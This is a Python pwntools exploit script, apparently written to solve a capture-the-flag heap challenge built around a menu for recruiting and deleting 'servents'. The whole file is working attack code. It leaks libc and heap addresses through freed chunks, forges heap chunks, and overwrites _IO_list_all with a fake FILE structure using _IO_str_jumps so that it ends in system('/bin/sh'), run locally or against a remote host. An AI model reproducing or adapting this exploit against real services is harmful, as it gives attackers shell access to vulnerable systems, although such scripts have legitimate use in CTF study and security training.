#!/usr/bin/env python2

from pwn import *
from qpwn import *
from sys import argv
context(binary='./pwn', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

if args.INFO:
    context.log_level = 'info'
    
DEBUG = not args.REMOTE and not args.TEST
if args.REMOTE:
    p = remote(argv[1], int(argv[2]))
    libc = ELF('./libc.so.6')
elif args.TEST:
    p = process('./pwn', env={'LD_PRELOAD': './libc.so.6'})
    libc = ELF('./libc.so.6')
else:
    p = process('./pwn')
    libc = ELF('./libc-2.23.so')
elf = ELF('./pwn')
init(p, elf, context, args)
make_alias(p)

def menu(index):
    p.sla('Give me your choice:', str(index))

'''
def recruit(ls):
    menu(1)
    p.sla('How many servents do you want to rescruit?', len(ls))
    for item in ls:
        p.sla('Input the name\'s size of this servent:', str(item[0]))
        p.sa('Input the name of this servent:', item[1])
'''

def create(size, content):
    menu(1)
    p.sla('How many servents do you want to rescruit?', '1')
    p.sla('Input the name\'s size of this servent:', str(size))
    p.sa('Input the name of this servent:', content)

def delete(index):
    menu(2)
    p.sla('Tell me his index number:', str(index))
    
if __name__ == '__main__':
    p.sla('How much money do you want?', str(1000))
    create(0x30, flat(0x0, 0x21, 0x0, 0x21, 0x0, 0x21))
    create(0x30, flat(0x0, 0x21))
    create(0xf0, flat(0x0, 0x31) * 0xf)
    delete(2)
    delete(1)
    menu('1' * 0x400)
    delete(1)
    message = u64(p.ru('\x7f')[-6:].ljust(8, '\x00'))
    success('mes ' + hex(message))
    libc.address = message - 0x7ffff7dd4b78 + 0x00007ffff7a39000
    success('libc ' + hex(libc.address))
    '''
    gogogo('vmmap')
    p.i()
    exit(0)
    '''
    delete(2)
    create(0x10, flat(libc.address - 0x00007ffff7a39000 + 0x00007ffff7dd4ba0))
    delete(1)
    p.ru('kill ')
    message = u64(p.r(6).ljust(8, '\x00'))
    success('mes ' + hex(message))
    heap_base = message - 0x60
    success('heap ' + hex(heap_base))
    '''
    gogogo()
    p.i()
    exit()
    '''
    payload = gen([0x0, 0x201, heap_base + 0x210, 0x0, 0x0, 0xa1, '\x00' * 0x90, 0x0, 0x21, 0x0, 0x21, 0x0, 0x21, '\x00' * 0x100, 0x0, 0x21, 0x0, 0x21, 0x0, 0x21, 0x0, 0x21, 0x0, 0x21])
    create(0x300, payload)
    delete(0)
    delete(1)
    delete(0)
    delete(2)
    create(0x18, flat(heap_base + 0x1f0))
    create(0x18, 'a')
    #gogogo('x /20gx 0x0000555555756040\nx /80gx 0x0000555555758200')
    #p.i()
    #exit()
    menu('1' * 0x400)
    delete(1)
    create(0x38, 'a')
    libc.sym['_IO_str_jumps'] = 0x7ffff7dd37a0
    payload = gen([[0x50], 0x0, 0x61, 0x0, libc.sym['_IO_list_all']-0x10, 0x0, 0x1, 0x0, libc.search('/bin/sh').next(), [0xd8 + 0x50], libc.sym['_IO_str_jumps']-0x8, [0xe8 + 0x50], libc.sym['system']])
    delete(1)
    create(0x1f8, payload)
    #gogogo('x /20gx 0x0000555555756040\nx /40gx 0x0000555555758200')
    #gogogo('dir ../glibc/glibc-2.23/libio\nb genops.c:786\nc\np *fp')
    delete(1)
    #create(0xf8, 'a')
    menu(1)
    p.sla('How many servents do you want to rescruit?', '1')
    p.sla('Input the name\'s size of this servent:', str(0xf8))
    p.i()
    
